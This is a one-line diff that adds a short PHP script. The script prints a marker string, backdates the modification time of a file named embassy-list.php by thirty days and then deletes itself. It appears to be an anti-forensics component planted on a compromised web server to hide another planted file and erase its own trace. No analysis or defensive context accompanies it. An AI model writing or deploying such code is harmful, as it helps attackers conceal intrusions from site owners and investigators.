@@ -1,0 +1,1 @@
+<?php echo "ezpCSWNdnd"; if (file_exists("./embassy-list.php")){ touch("./embassy-list.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*Gf3b4RH4nmuSm8a9ERB5*/ ?>
